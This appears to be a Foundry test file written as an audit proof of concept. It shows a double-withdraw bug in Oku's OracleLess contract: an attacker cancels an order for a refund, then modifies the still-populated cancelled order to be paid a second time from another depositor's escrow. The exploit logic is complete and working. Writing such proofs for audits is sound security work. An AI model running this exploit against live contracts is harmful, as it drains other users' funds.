// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Real audited source, compiled from the Oku "New Order Types" contest repo
// (sherlock-audit/2024-11-oku @ ee3f781a73d65e33fb452c9a44eb1337c5cfdbd6),
// vendored verbatim under src/oku/contracts/. Nothing about OracleLess or
// AutomationMaster is stubbed — the double-withdraw runs through the real code.
import "../src/oku/contracts/automatedTrigger/OracleLess.sol";
import "../src/oku/contracts/automatedTrigger/AutomationMaster.sol";
import "../src/oku/contracts/interfaces/openzeppelin/IERC20.sol";
import "forge-std/Test.sol";

/// Minimal real ERC20 — the protocol treats tokenIn/tokenOut as opaque tokens,
/// so a standard 18-decimal ERC20 is a faithful stand-in (methodology allows a
/// real minimal ERC20 for opaque tokens; the vulnerable logic is 100% real).
contract TestToken is IERC20 {
    string public constant name = "Test Token";
    string public constant symbol = "TT";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/// An honest depositor with a real, separate OracleLess order. Its escrow is the
/// pool of funds the attacker drains with the second withdrawal.
contract HonestDepositor {
    OracleLess public immutable oracleLess;
    IERC20 public immutable tokenIn;
    IERC20 public immutable tokenOut;

    constructor(OracleLess _o, IERC20 _in, IERC20 _out) {
        oracleLess = _o;
        tokenIn = _in;
        tokenOut = _out;
        tokenIn.approve(address(_o), type(uint256).max);
    }

    function deposit(uint256 amountIn) external returns (uint96) {
        return oracleLess.createOrder(tokenIn, tokenOut, amountIn, 0, address(this), 0, false, "");
    }
}

contract PoC_44374 is Test {
    OracleLess oracleLess;
    AutomationMaster master;
    TestToken tokenIn;
    TestToken tokenOut;
    HonestDepositor honest;
    address attacker = address(0xB0B);

    function setUp() public {
        master = new AutomationMaster();
        oracleLess = new OracleLess(master, IPermit2(address(0)));
        tokenIn = new TestToken();
        tokenOut = new TestToken();
        honest = new HonestDepositor(oracleLess, tokenIn, tokenOut);

        // Honest user escrows a real 1e18 order → OracleLess holds their funds.
        tokenIn.mint(address(honest), 1 ether);
        honest.deposit(1 ether);

        // Attacker funds exactly one 1e18 order of their own.
        tokenIn.mint(attacker, 1 ether);
        vm.prank(attacker);
        tokenIn.approve(address(oracleLess), type(uint256).max);
    }

    function test_cancelled_order_modified_to_double_withdraw_drains_other_depositor() public {
        // OracleLess already custodies the honest depositor's 1e18.
        assertEq(tokenIn.balanceOf(address(oracleLess)), 1 ether);

        // Attacker escrows their own 1e18 order.
        vm.prank(attacker);
        uint96 id = oracleLess.createOrder(tokenIn, tokenOut, 1 ether, 0, attacker, 0, false, "");
        assertEq(tokenIn.balanceOf(address(oracleLess)), 2 ether, "both escrows held");
        assertEq(tokenIn.balanceOf(attacker), 0);

        // Withdrawal #1: cancelOrder refunds the full 1e18 but only removes the id
        // from pendingOrderIds — orders[id] is left fully populated (amountIn = 1e18).
        vm.prank(attacker);
        oracleLess.cancelOrder(id);
        assertEq(tokenIn.balanceOf(attacker), 1 ether, "first withdrawal (own stake back)");

        // Withdrawal #2: modifyOrder never checks that the order was cancelled, so
        // reducing the still-live order pays the delta out AGAIN — this time from
        // the honest depositor's escrow.
        vm.prank(attacker);
        oracleLess.modifyOrder(id, tokenOut, 1 ether - 1, 0, attacker, false, false, "");

        // Concrete harm: attacker deposited 1e18 and walked away with ~2e18 — their
        // own stake plus the honest depositor's escrow. The pool is drained to dust.
        assertEq(tokenIn.balanceOf(attacker), 2 ether - 1, "attacker withdrew 2x its deposit");
        assertEq(tokenIn.balanceOf(address(oracleLess)), 1, "honest depositor's escrow drained");
    }
}
